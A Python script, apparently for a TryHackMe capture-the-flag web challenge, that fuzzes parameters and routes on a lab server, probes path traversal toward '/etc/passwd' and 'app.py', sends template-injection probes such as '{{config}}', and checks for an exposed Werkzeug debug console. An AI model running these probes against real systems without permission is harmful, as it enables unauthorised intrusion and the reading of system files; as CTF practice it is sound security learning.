import requests
import re

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# 1) Fuzz query params on /cupids_secret_vault/
print("=== Param fuzz on /cupids_secret_vault/ ===")
params_to_try = [
    "file", "page", "template", "layout", "name", "path",
    "url", "src", "source", "content", "text", "data",
    "letter", "message", "note", "id", "user", "view",
    "render", "include", "load", "read", "doc", "type",
    "theme", "style", "format", "lang", "mode", "action",
    "cmd", "command", "exec", "q", "query", "search",
    "input", "target", "redirect", "next", "return",
    "callback", "ref", "goto", "to", "from",
]

default_r = s.get(f"{BASE}/cupids_secret_vault/", timeout=10)
default_len = len(default_r.text)

for param in params_to_try:
    r = s.get(f"{BASE}/cupids_secret_vault/", params={param: "test123"}, timeout=5)
    if len(r.text) != default_len:
        print(f"  ?{param}=test123 -> {r.status_code} ({len(r.text)} bytes, default={default_len})")
        print(f"    {r.text[:300]}")
        for f in FLAG_RE.findall(r.text):
            print(f"    [FLAG] {f}")

# 2) Fuzz params on / root
print("\n=== Param fuzz on / ===")
default_root = s.get(f"{BASE}/", timeout=10)
default_root_len = len(default_root.text)

for param in params_to_try:
    r = s.get(f"{BASE}/", params={param: "test123"}, timeout=5)
    if len(r.text) != default_root_len:
        print(f"  ?{param}=test123 -> {r.status_code} ({len(r.text)} bytes, default={default_root_len})")
        print(f"    {r.text[:300]}")

# 3) Try path as part of URL (catch-all routes)
print("\n=== Catch-all route test ===")
catch_all_paths = [
    "/cupids_secret_vault/../../etc/passwd",
    "/cupids_secret_vault/../app.py",
    "/cupids_secret_vault/..%2fapp.py",
    "/cupids_secret_vault/..%2f..%2fetc%2fpasswd",
    "/love_letter",
    "/letter",
    "/letter/1",
    "/letters",
    "/letters/anonymous",
    "/anonymous",
    "/board",
    "/post",
    "/submit",
    "/create",
    "/new",
    "/compose",
]
for p in catch_all_paths:
    try:
        r = s.get(f"{BASE}{p}", timeout=5, allow_redirects=False)
        if r.status_code != 404:
            body = r.text[:150].replace("\n", " ")
            print(f"  {p} -> {r.status_code} ({len(r.text)} bytes) | {body}")
    except:
        pass

# 4) SSTI in various places
print("\n=== SSTI probes ===")
ssti_payloads = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}"]

# In URL path
for payload in ssti_payloads:
    try:
        r = s.get(f"{BASE}/{payload}", timeout=5)
        if "49" in r.text or "config" in r.text.lower():
            print(f"  GET /{payload} -> {r.status_code} | HIT: {r.text[:200]}")
    except:
        pass

# In query params on vault
for payload in ssti_payloads:
    for param in ["name", "template", "page", "letter", "message", "q"]:
        try:
            r = s.get(f"{BASE}/cupids_secret_vault/",
                     params={param: payload}, timeout=5)
            if len(r.text) != default_len or "49" in r.text:
                print(f"  vault?{param}={payload} -> diff response ({len(r.text)} bytes)")
                print(f"    {r.text[:300]}")
        except:
            pass

# 5) Try Werkzeug debugger PIN bypass
print("\n=== Werkzeug debugger ===")
r = s.get(f"{BASE}/console", timeout=5)
print(f"  Status: {r.status_code}")
# If debugger is on, we need PIN - try from robots.txt
if r.status_code == 200:
    print(f"  Console available!")
    print(f"  {r.text[:500]}")

# 6) Check if any static files leak info
print("\n=== Static file discovery ===")
statics = [
    "/static/", "/static/css/", "/static/js/", "/static/img/",
    "/static/style.css", "/static/app.js", "/static/main.js",
    "/static/config.json", "/static/data.json",
]
for p in statics:
    try:
        r = s.get(f"{BASE}{p}", timeout=5)
        if r.status_code != 404 and len(r.text) > 0:
            print(f"  {p} -> {r.status_code} ({len(r.text)} bytes)")
            if len(r.text) < 500:
                print(f"    {r.text[:300]}")
    except:
        pass

# 7) OPTIONS / HEAD to discover methods
print("\n=== HTTP methods ===")
for ep in ["/", "/cupids_secret_vault/"]:
    try:
        r = s.options(f"{BASE}{ep}", timeout=5)
        allow = r.headers.get("Allow", "?")
        print(f"  OPTIONS {ep} -> {r.status_code}, Allow: {allow}")
    except:
        pass
    try:
        r = s.head(f"{BASE}{ep}", timeout=5)
        print(f"  HEAD {ep} -> {r.status_code}")
    except:
        pass
    try:
        r = s.put(f"{BASE}{ep}", timeout=5)
        if r.status_code != 404 and r.status_code != 405:
            print(f"  PUT {ep} -> {r.status_code} ({len(r.text)} bytes)")
    except:
        pass
    try:
        r = s.patch(f"{BASE}{ep}", timeout=5)
        if r.status_code != 404 and r.status_code != 405:
            print(f"  PATCH {ep} -> {r.status_code} ({len(r.text)} bytes)")
    except:
        pass
    try:
        r = s.delete(f"{BASE}{ep}", timeout=5)
        if r.status_code != 404 and r.status_code != 405:
            print(f"  DELETE {ep} -> {r.status_code} ({len(r.text)} bytes)")
    except:
        pass
